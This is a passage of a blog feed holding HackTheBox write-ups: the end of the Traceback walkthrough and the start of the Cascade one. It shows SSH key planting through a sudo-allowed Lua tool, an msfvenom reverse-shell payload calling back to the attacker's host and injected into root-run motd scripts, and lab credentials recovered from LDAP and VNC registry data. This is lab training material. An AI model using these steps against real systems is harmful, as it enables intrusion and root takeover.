&lt;p&gt;We find file under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/webadmin/note.txt&lt;/code&gt; which refers to a tool to practice lua.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-notes.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lua&lt;/code&gt; is a lightweight, high-level, multi-paradigm programming language designed primarily for embedded use in applications.&lt;/p&gt;

&lt;p&gt;The tool to practice lua script is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Luvit&lt;/code&gt;. He is mentionned above on the result of the command sudo -l.&lt;/p&gt;

&lt;h3 id=&quot;ssh-authorized-keys&quot;&gt;SSH Authorized Keys&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;With present misconfiguration on sudo command for the sysadmin user, we use personnal lua script to send my public ssh key in her folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*/.ssh/authorized_keys&lt;/code&gt;. Same method in other machine : See Postman Writeup.&lt;/p&gt;

&lt;p&gt;Reference - lua script : &lt;a href=&quot;https://www.tutorialspoint.com/lua/lua_file_io.htm&quot;&gt;https://www.tutorialspoint.com/lua/lua_file_io.htm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;After search in the documentation, we can define the script pattern to be used :&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CODEfile &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; io.open &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;filename &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;, mode]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
file:write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--test&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
file:close&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
.....
filename &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/home/sysadmin/.ssh/authorized_keys&quot;&lt;/span&gt;
mode &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt; Append mode that opens an existing file or creates a new file &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;appending.
&lt;span class=&quot;nt&quot;&gt;--test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pub ssh key value&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We generate our ssh key pair to put the public key value in our lua script.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; rsa &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 2048
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-scriptlua.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We upload the script from the webshell and execute this under root privilege.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-upload.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-runscript.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-service-ssh-login&quot;&gt;Remote Service SSH login&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We have now the possibility to connect on sysadmin through ssh :&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ssh sysadmin@10.10.10.181 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; traceback
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-sysadminssh.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-user&quot;&gt;Flag user&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We flag the user to validate the compromission of the system user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-userflag.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-privilege-escalation---gain-higher-level-permissions&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[3] Privilege Escalation - Gain higher-level permissions&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;privilege-misconfiguration&quot;&gt;Privilege Misconfiguration&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We use linpeas script to check every possible path to increase our privilege.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-sendlinpeas.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The script reveal interesting group named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/update-motd.d&lt;/code&gt; where many files are writables with sysadmin privilege.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-groupwfiles.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can confirm that with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-verifwfile.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;According to linux manual :&lt;/p&gt;

&lt;p&gt;“UNIX/Linux system adminstrators often communicate important information to console and remote users by maintaining text in the file /etc/motd, which is displayed by the pam_motd(8) module on interactive shell logins. Traditionally, this file is static text, typically installed by the distribution and only updated on release upgrades, or overwritten by the local administrator with pertinent information.&lt;/p&gt;

&lt;p&gt;Ubuntu introduced the update-motd framework, by which the motd(5) is dynamically assembled from a collection of scripts at login.&lt;/p&gt;

&lt;p&gt;Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at each login, and this information is concatenated in /var/run/motd. The order of script execution is determined by the run-parts(8) –lsbsysinit option (basically alphabetical order, with a few caveats).”&lt;/p&gt;

&lt;p&gt;Reference - Manual Linux Update-motd.d : &lt;a href=&quot;http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html&quot;&gt;http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here you can see how this works when you log on to ssh :&lt;/p&gt;

&lt;p&gt;For this example /etc/update-motd.d/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00-header&lt;/code&gt; file = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Welcome to Xh4H land&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-headerssh.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The use of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pspy tool&lt;/code&gt; confirms the execution of these scripts under root privilege &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(UID 0)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-checkprocess.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-sshview.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;obtaining-reverse-shell-with-payload-injection&quot;&gt;Obtaining Reverse Shell with Payload Injection&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We can push custom payload into one of theses script to get reverse shell under root privilege when they are executed.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x64/shell_reverse_tcp &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shell &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.54 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After creating our payload, we send it to our target machine and place it in the /tmp/ folder.&lt;/p&gt;

&lt;p&gt;Now we can call our payload to be executed in one of the scripts in the update-motd.d folder. I choose 00-header.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-insertpayload.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We prepare our attacking machine to receive the shell with nc command and we launch new ssh connexion.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-viewexploit.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-root&quot;&gt;Flag root&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We obtained the shell under root privilege. We have compromise Traceback machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-rootflag.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;trophy&quot;&gt;&lt;strong&gt;&lt;center&gt;Trophy&lt;/center&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;Chanda Kochhar&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>ScarNGone &amp; pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="WINDOWS" /><category term="EASY" /><category term="ENUMERATION" /><category term="SCRIPTING" /><category term="SUDO EXPLOITATION" /><category term="PERMISSION EXPLOITATION" /><category term="PAYLOAD" /><summary type="html">Ref°: HTB-13-Machine</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/traceback/HTB-Badge-Traceback.png" /><media:content medium="image" url="/assets/images/traceback/HTB-Badge-Traceback.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Write-up Cascade Machine</title><link href="/posts/HTB-12-Pentest-Cascade/" rel="alternate" type="text/html" title="Write-up Cascade Machine" /><published>2020-07-25T17:00:00+02:00</published><updated>2020-07-25T17:00:00+02:00</updated><id>/posts/HTB-12-Pentest-Cascade</id><content type="html" xml:base="/posts/HTB-12-Pentest-Cascade/">&lt;p&gt;&lt;strong&gt;&lt;center&gt;Ref°: HTB-12-Machine&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;— Cascade is a Windows Medium machine which highlights the misconfiguration of the accounts and strength in the use of code review to recover sensitive information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Information-Cascade.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-discovery---figure-out-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[1] Discovery - Figure out environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;network-service-scanning&quot;&gt;Network Service Scanning&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Nmap scan reveal many services on her usual port such as : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kerberos&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt;, etc.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;server-message-block&quot;&gt;Server Message Block&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;My first reaction is to use enum4linux to hope find many users and the domain to pwned.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;enum4linux 10.10.10.182
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And we got all of this : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator, krbtgt, e.crowe, b.hanson, i.croft, CascGuest, arksvc, s.smith, r.thompson, util, j.wakefield, s.hickson, j.goodhand, a.turnbull, d.burman, BackupSvc, j.allen&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-enum4linux.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also use rpcclient to find the same thing.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; 10.10.10.182
&lt;span class=&quot;gp&quot;&gt;rpcclient $&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; enumdomusers
&lt;span class=&quot;go&quot;&gt;user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;smb and kerberos services reveal nothing.&lt;/p&gt;

&lt;h3 id=&quot;lightweight-directory-access-protocol&quot;&gt;Lightweight Directory Access Protocol&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We use ldapsearch tool to find other information through ldap service.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 389 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dc=cascade,dc=local&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ldapsearch.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;2-foothold---get-into-the-target-&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[2] Foothold - Get into the target &lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;encoded-password-from-attribute&quot;&gt;Encoded Password from attribute&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;To perform the enumeration, we grep all information reference by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwd&lt;/code&gt;.
Here we find interesting attribute with name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cascadeLegacyPwd&lt;/code&gt; from the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.thompson&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clk0bjVldmE=&lt;/code&gt; he seem to be her hash password encode in base 64?&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Pwd&quot;&lt;/span&gt; ldapsearch.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-attribute.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;decoding-password&quot;&gt;Decoding Password&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;No vulnerabilities identify here, but we have possibility to decrypt hash password of the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.thompson&lt;/code&gt;. 
We can exploit this to access and gain a foothold.&lt;/p&gt;

&lt;p&gt;We create file which contain the hash password and use this command to decrypt:&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; passwd.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-decode.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We found the password : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rY4n5eva&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-service-smb-login&quot;&gt;Remote Service SMB login&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We can use this credential to access of the target through smb service.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; r.thompson &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; rY4n5eva &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.182
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;smbmap tool reveal more available share with this account, but the more interesting is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data&lt;/code&gt; share.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-share_data.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-lateral-movement---move-through-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[3] Lateral Movement - Move through environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;encrypted-password-from-reg-file&quot;&gt;Encrypted Password from .reg file&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Enumeration of Data Share :&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs //10.10.10.182/Data share_data &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'r.thompson'&lt;/span&gt;,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;rY4n5eva
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/IT/Email Archives/&lt;/code&gt;, we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Meeting_Notes_June_2018.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-archive_mail.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This email archive reveal about temporary account which used to perform all tasks related to the network migration and this account has been deleted. The username was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TempAdmin&lt;/code&gt; and the password is the same of the normal admin account.&lt;/p&gt;

&lt;p&gt;Under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/IT/Logs/Ark AD Recycle Bin/&lt;/code&gt;, we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArkAdRecycleBin;Log&lt;/code&gt;.
This file show us two things :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;We have execution of program by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArkSvc&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;TempAdmin account has been moved to AD recycle bin&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-log.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/IT/Temp/s.smith/&lt;/code&gt;, we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VNC Install.reg&lt;/code&gt;.
This file contain password in hex format …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-vnc_reg.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;decrypting-password&quot;&gt;Decrypting Password&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;I find tool to decrypt vnc password in hex format.&lt;/p&gt;

&lt;p&gt;Reference - vncpasswd tool : &lt;a href=&quot;https://github.com/trinitronx/vncpasswd.py&quot;&gt;https://github.com/trinitronx/vncpasswd.py&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python2 vncpasswd.py &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 6bcf2a4b6e5aca0f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We found password : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sT333ve2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-vnc_decode.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-service-winrm-login&quot;&gt;Remote Service WinRM login&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We have now the possibility to connect through evil-winrm and grab the flag user.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; s.smith &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; sT333ve2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;flag-user&quot;&gt;Flag user&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-flag_user.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-lateral-movement---move-through-environment-2&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[4] Lateral Movement - Move through environment 2&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;remote-service-smb-login-1&quot;&gt;Remote Service SMB login&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;smbmap tool reveal more available share with this new account, but the more interesting is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audit$&lt;/code&gt; share.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;smbmap -u s.smith -p sT333ve2 -H 10.10.10.182
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs //10.10.10.182/audit&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;share_audit &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'s.smith'&lt;/span&gt;,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sT333ve2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/audit/DB/&lt;/code&gt;, we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Audit.db&lt;/code&gt;.&lt;/p&gt;

